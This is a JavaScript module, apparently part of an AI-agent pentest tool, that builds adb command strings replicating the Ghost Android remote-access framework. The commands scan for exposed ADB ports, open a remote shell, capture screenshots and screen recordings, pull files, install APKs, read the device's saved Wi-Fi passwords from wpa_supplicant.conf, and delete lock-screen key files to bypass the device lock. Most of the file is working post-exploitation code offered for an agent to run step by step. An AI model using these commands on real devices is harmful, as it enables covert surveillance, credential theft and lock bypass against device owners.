// Ghost — Android remote-access / post-exploitation over ADB (modeled on EntynetProject's Ghost Framework).
//
// Ghost drives a target Android device through the **Android Debug Bridge (ADB)** over TCP/IP (default port
// 5555) or USB. Exposed ADB-over-network is a REAL, well-known attack surface (the ADB.Miner worm, countless
// misconfigured devices/TVs/emulators) — reaching a device where ADB is enabled gives an unauthenticated
// remote shell. This tag replicates Ghost's full feature menu via clean, parseable adb commands so the agent
// can drive a device step by step (connect → enumerate → pull/screenshot/control) instead of a TUI.
//
// HARDWARE/NETWORK REALITY (same honesty rule as wireless/bluetooth): ADB needs to REACH the device — the
// device must have ADB-over-TCP enabled and its :5555 reachable from the exec backend, or be USB-attached to
// the machine running the backend. No reachable device → an honest "no device" message, never fabricated data.
// Runs best on the desktop app (host backend on the same LAN as the target).

const ADB_PORT = 5555;

// Install adb if missing, then make sure the adb server is up.
const ENSURE_ADB =
  'command -v adb >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; ' +
  'apt-get install -y adb android-tools-adb >/dev/null 2>&1; }; adb start-server >/dev/null 2>&1; ';

// Honest "no device / can't reach" marker so the handler can surface it (never invent device data).
const NO_DEVICE_MSG =
  'GHOST-NODEVICE: No reachable Android device over ADB. Ghost needs the target to have ADB-over-network ' +
  'enabled with tcp:5555 reachable from the exec backend (or a USB-attached device on the backend machine). ' +
  'On a cloud/Windows-WSL backend a LAN device is usually unreachable — run the exec backend on the desktop ' +
  'app / a machine on the same network as the target, then retry. Do NOT fabricate device info.';

// Normalize a target to host:port (default :5555). Empty stays empty.
function withPort(t) {
  const s = String(t || '').trim();
  if (!s) return '';
  return /:\d+$/.test(s) ? s : `${s}:${ADB_PORT}`;
}

// Quote a value for a single-quoted shell context.
const q = (s) => `'${String(s).replace(/'/g, `'\\''`)}'`;

// Build a shell command for a Ghost/ADB action.
//   action : check|scan|connect|disconnect|devices|shell|sysinfo|screenshot|screenrecord|pull|apps|
//            install|uninstall|run|logcat|battery|network|wifi|macinet|wpa|extract-apk|current|input|
//            forward|reboot|shutdown|unlock
//   target : device IP or IP:port (or a CIDR/IP for `scan`)
//   arg    : action-specific (command / remote path / package / apk / keycode / on|off / seconds …)
//   arg2   : second arg where needed (local path / local port …)
export function buildGhostCommand({ action, target, arg, arg2 } = {}) {
  const t = String(target || '').trim();
  const isIp = /^\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?$/.test(t);   // 192.168.1.20 or 192.168.1.20:5555
  // TCP target → normalize to ip:5555 + auto-connect. USB target → a device SERIAL, used with -s, NO connect.
  const SER = t ? (isIp ? withPort(t) : t) : '';
  const conn = (SER && isIp) ? `adb connect ${SER} >/dev/null 2>&1; ` : '';
  const dev = SER ? `-s ${SER} ` : '';    // empty → adb auto-selects the single connected (USB) device
  const sh = (c) => ENSURE_ADB + conn + `adb ${dev}${c}`;               // adb subcommand on the device
  const shell = (c) => ENSURE_ADB + conn + `adb ${dev}shell ${c}`;       // device shell one-liner
  // connect/scan genuinely need an IP; device actions work over USB with no target (single device auto-select).
  const needTarget = (fn) => (SER ? fn() : `echo ${q('GHOST-USAGE: this action needs a target IP (e.g. ```ghost connect 192.168.1.20). Run ```ghost scan <cidr> first. (For a USB-attached device just use ```ghost devices then ```ghost sysinfo <serial>.)'.replace(/```/g, ''))}`);

  switch (action) {
    case 'check':
      // Preflight: adb present? any devices? (like bluetooth `check`).
      return ENSURE_ADB + 'echo "[*] adb: $(adb version 2>/dev/null | head -1)"; echo "[*] devices:"; adb devices -l';
    case 'scan':
      // Find exposed ADB across a host/CIDR — the recon step (open :5555 = the vuln).
      return needTarget(() =>
        `command -v nmap >/dev/null 2>&1 || apt-get install -y nmap >/dev/null 2>&1; ` +
        `echo "[*] scanning ${target} for exposed ADB (tcp/${ADB_PORT})"; ` +
        `nmap -Pn -p ${ADB_PORT} --open ${target}`);
    case 'connect':
      return needTarget(() => ENSURE_ADB + `adb connect ${SER}; adb devices -l`);
    case 'disconnect':
      return ENSURE_ADB + (SER ? `adb disconnect ${SER}` : 'adb disconnect');
    case 'devices':
    case 'list':
      return ENSURE_ADB + 'adb devices -l';
    // ── device actions: work over USB (serial or single-device auto-select) OR a connected TCP target ──
    case 'shell':
      return shell(q(arg || 'id; getprop ro.product.model'));
    case 'sysinfo':
    case 'info':
      return shell(q(
        'echo "== device =="; getprop ro.product.manufacturer; getprop ro.product.model; ' +
        'getprop ro.product.name; getprop ro.build.version.release; getprop ro.build.version.sdk; ' +
        'getprop ro.serialno; echo "== abi =="; getprop ro.product.cpu.abi; ' +
        'echo "== battery =="; dumpsys battery | grep -E "level|status" '));
    case 'screenshot':
      return ENSURE_ADB + conn + `adb ${dev}shell screencap -p /sdcard/cm_ghost.png && ` +
        `adb ${dev}pull /sdcard/cm_ghost.png ./ghost_screenshot.png && ` +
        `adb ${dev}shell rm /sdcard/cm_ghost.png; echo "[+] saved ./ghost_screenshot.png"`;
    case 'screenrecord': {
      const secs = Math.max(1, Math.min(180, parseInt(arg, 10) || 10));
      return ENSURE_ADB + conn + `adb ${dev}shell screenrecord --time-limit ${secs} /sdcard/cm_ghost.mp4 && ` +
        `adb ${dev}pull /sdcard/cm_ghost.mp4 ./ghost_record.mp4 && ` +
        `adb ${dev}shell rm /sdcard/cm_ghost.mp4; echo "[+] saved ./ghost_record.mp4"`;
    }
    case 'pull':
      return arg ? sh(`pull ${q(arg)} ${arg2 ? q(arg2) : './'}`) : `echo ${q('GHOST-USAGE: pull needs a remote path, e.g. ghost pull /sdcard/DCIM')}`;
    case 'apps':
    case 'list-apps':
      return shell(q('pm list packages -3'));  // third-party apps
    case 'install':
      return arg ? sh(`install ${q(arg)}`) : `echo ${q('GHOST-USAGE: install needs a local .apk path')}`;
    case 'uninstall':
      return arg ? sh(`uninstall ${q(arg)}`) : `echo ${q('GHOST-USAGE: uninstall needs a package name')}`;
    case 'run':
      return arg ? shell(q(`monkey -p ${arg} -c android.intent.category.LAUNCHER 1`)) : `echo ${q('GHOST-USAGE: run needs a package name')}`;
    case 'logcat':
    case 'device-log':
      return shell(q('logcat -d -t 200'));
    case 'battery':
      return shell(q('dumpsys battery'));
    case 'network':
    case 'netstat':
      return shell(q('echo "== ip =="; ip addr 2>/dev/null || ifconfig; echo "== wifi =="; dumpsys wifi | grep -E "SSID|mNetworkInfo" | head; echo "== conn =="; dumpsys connectivity | grep -E "NetworkAgentInfo|type:" | head'));
    case 'wifi': {
      const on = /^(on|enable|1|true)$/i.test(String(arg || 'on'));
      return shell(q(`svc wifi ${on ? 'enable' : 'disable'}; echo wifi ${on ? 'enabled' : 'disabled'}`));
    }
    case 'macinet':
    case 'ip':
      return shell(q('ip addr show 2>/dev/null || netcfg 2>/dev/null || ifconfig'));
    case 'wpa':
    case 'wpa-supplicant':
      return shell(q('su -c "cat /data/misc/wifi/wpa_supplicant.conf" 2>/dev/null || cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo "GHOST-NOROOT: wpa_supplicant needs root on the device"'));
    case 'extract-apk':
      return arg
        ? ENSURE_ADB + conn + `P=$(adb ${dev}shell pm path ${q(arg)} | sed -e 's/package://' -e 's/\\r//' | head -1); ` +
          `[ -n "$P" ] && adb ${dev}pull "$P" ./${arg}.apk && echo "[+] saved ./${arg}.apk" || echo "GHOST: package not found"`
        : `echo ${q('GHOST-USAGE: extract-apk needs a package name')}`;
    case 'current':
    case 'current-activity':
      return shell(q('dumpsys activity activities | grep -E "mResumedActivity|topResumedActivity" | head -1 || dumpsys window | grep -E "mCurrentFocus" '));
    case 'input':
    case 'button':
      return arg ? shell(q(`input keyevent ${/^\d+$/.test(String(arg)) ? arg : `KEYCODE_${String(arg).toUpperCase()}`}`)) : `echo ${q('GHOST-USAGE: input needs a keycode (e.g. 26=power, 3=home, 4=back, 66=enter)')}`;
    case 'forward':
      return (arg && arg2) ? sh(`forward tcp:${arg} tcp:${arg2}`) : `echo ${q('GHOST-USAGE: forward needs <localPort> <remotePort>')}`;
    case 'reboot':
      return sh('reboot');
    case 'shutdown':
      return shell(q('reboot -p'));
    case 'unlock':
    case 'remove-password':
      // Destructive (needs root on the target) — demonstrate lock bypass on an AUTHORIZED test device only.
      return shell(q('su -c "rm -f /data/system/gesture.key /data/system/password.key /data/system/locksettings.db*; settings put system lock_pattern_autolock 0" 2>/dev/null && echo "[+] lock files removed (reboot the device)" || echo "GHOST-NOROOT: removing the device lock needs root"'));
    default:
      return `echo ${q(`GHOST-USAGE: unknown action "${action}". Try: check | scan <cidr> | connect <ip> | devices | shell <ip> <cmd> | sysinfo <ip> | screenshot <ip> | apps <ip> | pull <ip> <path> | logcat <ip> | network <ip> | current <ip> | input <ip> <key> | install/uninstall/run <ip> <pkg> | reboot/shutdown <ip>`)}`;
  }
}

// Honest "no reachable device" detection over the combined output.
export function isNoDevice(output) {
  const t = String(output || '');
  return /GHOST-NODEVICE|no devices?\/emulators? found|device (?:'[^']*' )?not found|failed to connect|cannot connect to|unable to connect|device offline|connection refused/i.test(t) &&
    !/\bconnected to\b/i.test(t);
}

// Turn Ghost/ADB output into findings (exposed ADB = the headline vuln; device intel = recon).
export function extractGhostFindings(command, output) {
  if (!/\badb\b|nmap -Pn -p 5555/i.test(command) || !output) return [];
  const out = [];
  const t = String(output);
  const source = 'ghost';

  // 1) Exposed ADB found by the scan (open :5555).
  if (/5555\/tcp\s+open/i.test(t)) {
    out.push({
      finding_type: 'android', severity: 'critical',
      title: `Exposed ADB (unauthenticated remote shell) on tcp/${ADB_PORT}`,
      evidence: (t.match(/.*5555\/tcp\s+open.*/i) || [''])[0].trim().slice(0, 160), source,
      cwe: 'CWE-306',
      remediation: 'Disable ADB over network (`adb usb` / Developer Options → turn off "ADB over network"/wireless debugging). Exposed :5555 grants anyone on the network a full unauthenticated shell on the device.',
    });
  }

  // 2) Live ADB connection established.
  const conn = /connected to\s+(\S+)/i.exec(t);
  if (conn && !/already connected/i.test(t)) {
    out.push({
      finding_type: 'android', severity: 'critical',
      title: `ADB remote access established to ${conn[1]}`,
      evidence: conn[0].slice(0, 160), source, cwe: 'CWE-284',
      remediation: 'The device accepted a remote ADB session — full device control (shell, file pull, app install) is possible. Disable network ADB and revoke unknown ADB keys.',
    });
  }

  // 3) Device intel (recon).
  const model = /\[ro\.product\.model\]:\s*\[([^\]]+)\]/i.exec(t) || /^([A-Za-z0-9 _-]+)\s*$/m.exec('');
  const rel = /\[ro\.build\.version\.release\]:\s*\[([^\]]+)\]/i.exec(t);
  if (model && model[1]) {
    out.push({
      finding_type: 'android', severity: 'info',
      title: `Android device intel: ${model[1]}${rel ? ` (Android ${rel[1]})` : ''}`,
      evidence: (model[0] || '').slice(0, 160), source,
    });
  }

  return out;
}

// Short label for the chat/history.
export function ghostLabel(body) {
  return 'ghost: ' + String(body || '').split('\n')[0].slice(0, 80);
}
